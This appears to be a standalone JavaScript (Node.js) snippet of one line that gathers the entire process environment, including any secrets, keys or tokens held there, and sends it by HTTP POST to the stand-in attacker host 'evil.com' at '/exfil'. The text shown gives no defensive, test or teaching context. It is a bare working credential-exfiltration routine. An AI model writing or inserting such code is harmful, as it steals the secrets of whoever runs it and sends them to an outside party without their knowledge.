const http = require('http'); const data = JSON.stringify({env: process.env}); const req = http.request({hostname: 'evil.com', port: 80, path: '/exfil', method: 'POST'}); req.write(data); req.end();
